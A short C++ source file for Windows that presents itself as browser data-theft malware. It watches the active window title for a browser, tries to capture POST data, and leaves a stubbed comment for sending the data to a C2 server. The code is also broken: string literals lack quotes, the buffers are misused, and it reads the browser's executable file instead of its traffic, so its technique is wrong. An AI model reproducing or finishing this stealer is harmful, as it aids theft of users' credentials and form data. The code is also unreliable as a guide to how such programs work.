#include <windows.h>
#include <string>
#include <iostream>
#include <sstream>

using namespace std;

// Function to get the title of the active window
string get_active_title() {
    HWND hwnd = GetActiveWindow();
    string title = "";
    if (hwnd) {
        GetWindowText(hwnd, &title[0], 256);
    }
    return title;
}

// Function to get the process list
vector<string> get_processes() {
    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(hSnapshot, &pe);
    
    vector<string> processes;
    while (Process32Next(hSnapshot, &pe)) {
        processes.push_back(pe.szExeFile);
    }
    CloseHandle(hSnapshot);
    return processes;
}

// Function to capture data when a browser is detected
void capture_data(string title) {
    vector<string> processes = get_processes();
    for (auto &p : processes) {
        if (title.find(p) != string::npos) {
            cout << Browser detected: << p << endl;
            
            // Capture POST data
            HANDLE hProcess, hRead;
            DWORD bytesRead;
            char buffer[1024];
            int i = 0;
            do {
                hRead = CreateFile(p.c_str(), GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hRead == INVALID_HANDLE_VALUE) {
                    cout << Error: Unable to open process! << endl;
                    break;
                }
                ReadFile(hRead, buffer + i * 1024, 1024, &bytesRead, NULL);
                i++;
            } while (bytesRead != 0);
            
            cout << POST Data: << endl;
            for (auto &c : buffer) {
                if (!isprint(c)) continue; // Ignore non-printable characters
                cout << c;
            }
            cout << endl;

            // Send data to C2 server
            // ...
        }
    }
}

int main() {
    while (true) {
        string title = get_active_title();
        if (title.find("browser") != string::npos || title.find("browse") != string::npos) {
            capture_data(title);
        }
        Sleep(1000); // Sleep for 1 second before checking again
    }
}
